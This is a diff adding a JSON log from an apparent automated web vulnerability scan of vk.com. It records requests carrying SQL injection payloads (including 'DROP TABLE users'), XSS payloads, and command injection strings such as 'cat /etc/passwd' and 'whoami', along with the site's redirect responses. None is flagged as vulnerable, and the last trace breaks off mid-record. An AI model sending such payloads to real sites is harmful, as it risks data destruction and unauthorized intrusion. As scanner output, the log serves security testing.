@@ -1,0 +1,1093 @@
+{
+  "metadata": {
+    "sessionId": "c16914f85fd023d9ecf05ba30480c617",
+    "target": "vk.com",
+    "startTime": "2026-05-09T11:22:00.983Z",
+    "endTime": "2026-05-09T11:22:46.896Z",
+    "duration": 45913,
+    "engine": "RealAuditEngine v1.0",
+    "totalTraces": 21,
+    "reproducible": true
+  },
+  "reconnaissance": {},
+  "vulnerabilityTests": {},
+  "evidence": {
+    "totalTraces": 21,
+    "tracesWithEvidence": 0,
+    "evidenceTypes": {},
+    "reproducibleTraces": 0
+  },
+  "rawTraces": [
+    {
+      "traceId": "8ec54d03ef781b89",
+      "target": "vk.com",
+      "payload": "' UNION SELECT NULL--",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?id='%20UNION%20SELECT%20NULL--",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:44.455Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:44 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Thu, 13 May 2027 08:44:42 GMT; path=/; domain=.vk.com",
+            "remixstlid=9081884998133134412_EJOXU4siJi5xqXOv8f6W9TwtdpTyuzjbQBpTlGI1r1T; expires=Sun, 09 May 2027 11:22:44 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "2JA__4abQFf1WcNqxl0JHwPmoZT5RQ",
+          "server-timing": "tid;desc=\"2JA__4abQFf1WcNqxl0JHwPmoZT5RQ\",front;dur=8.548"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:44.746Z",
+        "duration": 291
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "2c1c4384b4d485f5",
+      "target": "vk.com",
+      "payload": "'; DROP TABLE users--",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?id='%3B%20DROP%20TABLE%20users--",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:44.748Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:44 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Sun, 16 May 2027 01:18:02 GMT; path=/; domain=.vk.com",
+            "remixstlid=9086388597760606784_joEO9mY5oa2ZSt13jdiZa7EczFUAAvyqUPLqYA5aYCX; expires=Sun, 09 May 2027 11:22:44 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "QHE1Ya1hNOFsHMfCfO8erL7oYKpj5w",
+          "server-timing": "tid;desc=\"QHE1Ya1hNOFsHMfCfO8erL7oYKpj5w\",front;dur=7.733"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:44.846Z",
+        "duration": 98
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "9b5924a217bd3833",
+      "target": "vk.com",
+      "payload": "' AND 1=CONVERT(int, (SELECT @@version))--",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?id='%20AND%201%3DCONVERT(int%2C%20(SELECT%20%40%40version))--",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:44.846Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:45 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Wed, 05 May 2027 17:20:19 GMT; path=/; domain=.vk.com",
+            "remixstlid=9078366560924451080_Rnszctd9uSGmxzUXpGy8pi7gTwmUdOdW5SpZSLjivfH; expires=Sun, 09 May 2027 11:22:45 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "Rw9iIC7wALTdMMazu1xGV8_U83IUIA",
+          "server-timing": "tid;desc=\"Rw9iIC7wALTdMMazu1xGV8_U83IUIA\",front;dur=7.634"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:44.946Z",
+        "duration": 100
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "772b2333661309e2",
+      "target": "vk.com",
+      "payload": "<script>alert(1)</script>",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:44.947Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:45 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Thu, 06 May 2027 18:25:18 GMT; path=/; domain=.vk.com",
+            "remixstlid=9112706508083254869_Qhb31zWxqo0r6zH0BaRXTlG50C2mYxK48HoqCUAa1NH; expires=Sun, 09 May 2027 11:22:45 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "_mOP9V3FIfDJfRPd_MwhXIBPvA7Tkw",
+          "server-timing": "tid;desc=\"_mOP9V3FIfDJfRPd_MwhXIBPvA7Tkw\",front;dur=10.130"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:45.097Z",
+        "duration": 150
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "cf05bb8a2d3c5bb5",
+      "target": "vk.com",
+      "payload": "<img src=x onerror=alert(1)>",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:45.097Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:45 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Sun, 09 May 2027 16:10:29 GMT; path=/; domain=.vk.com",
+            "remixstlid=9103417833851951356_KYGeW0nzZZijI9D0fBH4ckyap87B8Jz9tixt8hdkb3P; expires=Sun, 09 May 2027 11:22:45 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "xe21wC7g0grpJuDvkypV307rqhOiUA",
+          "server-timing": "tid;desc=\"xe21wC7g0grpJuDvkypV307rqhOiUA\",front;dur=9.277"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:45.306Z",
+        "duration": 209
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "4fd5d7f7dc33fd9b",
+      "target": "vk.com",
+      "payload": "javascript:alert(1)",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?search=javascript%3Aalert(1)",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:45.306Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:45 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Sat, 08 May 2027 13:18:46 GMT; path=/; domain=.vk.com",
+            "remixstlid=9089907034970058427_JAV2mei46v5w1bpHyfx501QTwYxUrd5PQ2ZtKYjHKb4; expires=Sun, 09 May 2027 11:22:45 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "4GgGM01RLT1v6m-MVKJYiL-S0cUCrg",
+          "server-timing": "tid;desc=\"4GgGM01RLT1v6m-MVKJYiL-S0cUCrg\",front;dur=9.441"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:45.404Z",
+        "duration": 98
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "eed2ae59c2ba003c",
+      "target": "vk.com",
+      "payload": "<svg onload=alert(1)>",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?search=%3Csvg%20onload%3Dalert(1)%3E",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:45.404Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:45 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Wed, 12 May 2027 15:40:14 GMT; path=/; domain=.vk.com",
+            "remixstlid=9093143997202319152_wdXeoxk7wzmeJ7dnS5XGYBr9ddlqWPC7dkFetGOK2gz; expires=Sun, 09 May 2027 11:22:45 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "PfIXUCZgfEHSDfjFLp9lHJsWXXRSaw",
+          "server-timing": "tid;desc=\"PfIXUCZgfEHSDfjFLp9lHJsWXXRSaw\",front;dur=9.362"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:45.496Z",
+        "duration": 92
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "2a69a77bd57984b9",
+      "target": "vk.com",
+      "payload": "';alert(1);//",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?search='%3Balert(1)%3B%2F%2F",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:45.496Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:45 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Fri, 14 May 2027 09:22:15 GMT; path=/; domain=.vk.com",
+            "remixstlid=9082166473110713535_XWOOkEuXzXgsB1dzasxYOzF4FR2rdHvxNz2ULuqKhJz; expires=Sun, 09 May 2027 11:22:45 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "iE_Ut6GRPee80eRupvsxBYzG4JPPqA",
+          "server-timing": "tid;desc=\"iE_Ut6GRPee80eRupvsxBYzG4JPPqA\",front;dur=16.343"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:45.605Z",
+        "duration": 109
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "eb87a9a26298ed82",
+      "target": "vk.com",
+      "payload": "; ls -la",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?cmd=%3B%20ls%20-la",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:45.605Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:45 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Fri, 14 May 2027 13:02:34 GMT; path=/; domain=.vk.com",
+            "remixstlid=9087795972645017650_MTvGNgZpQ6s357NoqlbZUzPuKNTZzyssNq6xWPR0HZ0; expires=Sun, 09 May 2027 11:22:45 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "iqvWWAy9TkCoR448zls4VSmYG7uBFQ",
+          "server-timing": "tid;desc=\"iqvWWAy9TkCoR448zls4VSmYG7uBFQ\",front;dur=8.088"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:45.696Z",
+        "duration": 91
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "64b5e5ea5b6cd692",
+      "target": "vk.com",
+      "payload": "&& cat /etc/passwd",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?cmd=%26%26%20cat%20%2Fetc%2Fpasswd",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:45.696Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:45 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Wed, 05 May 2027 01:24:16 GMT; path=/; domain=.vk.com",
+            "remixstlid=9107921433479921156_GfzL7ugdAU6kFzzfsOlYB1IunDF8lbEHU20cyUQzZy0; expires=Sun, 09 May 2027 11:22:45 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "9NohQYcahBUcu8LByA4M6To1AH5IeA",
+          "server-timing": "tid;desc=\"9NohQYcahBUcu8LByA4M6To1AH5IeA\",front;dur=7.887"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:45.796Z",
+        "duration": 100
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "70840fd1e43a61d3",
+      "target": "vk.com",
+      "payload": "| whoami",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?cmd=%7C%20whoami",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:45.796Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:45 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Fri, 07 May 2027 07:45:51 GMT; path=/; domain=.vk.com",
+            "remixstlid=9111862083153971211_yeYy8vrxbxc8zWutzTnuiJ6hJy2YlX41zBRK6ODJabz; expires=Sun, 09 May 2027 11:22:45 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "OJ8EKuiRXiCwoaCeTY5J98WZJB5UgQ",
+          "server-timing": "tid;desc=\"OJ8EKuiRXiCwoaCeTY5J98WZJB5UgQ\",front;dur=8.263"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:45.896Z",
+        "duration": 100
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "90295b887ac5bfd5",
+      "target": "vk.com",
+      "payload": "`id`",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?cmd=%60id%60",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:45.896Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:46 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Sun, 16 May 2027 09:57:41 GMT; path=/; domain=.vk.com",
+            "remixstlid=9069500099159116455_hgmSsBZ6EMo9C5BSwKlqfMgTtjTTgla6vFKGGzTZuQD; expires=Sun, 09 May 2027 11:22:46 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "498PaidW2hLGoHOVI1qYTowivQHjMA",
+          "server-timing": "tid;desc=\"498PaidW2hLGoHOVI1qYTowivQHjMA\",front;dur=8.135"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:45.996Z",
+        "duration": 100
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "04b0568d8ba0f4ea",
+      "target": "vk.com",
+      "payload": "$(id)",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?cmd=%24(id)",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:45.996Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:46 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Tue, 04 May 2027 22:58:43 GMT; path=/; domain=.vk.com",
+            "remixstlid=9104402996271351875_jAzUaIcRcfKRPRnpoheL6JCm80bgJgMO8RctrgAtwCc; expires=Sun, 09 May 2027 11:22:46 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "MUFAPLuaYCC3NzdCe7W4zEEoGGH8Ow",
+          "server-timing": "tid;desc=\"MUFAPLuaYCC3NzdCe7W4zEEoGGH8Ow\",front;dur=23.241"
+        },
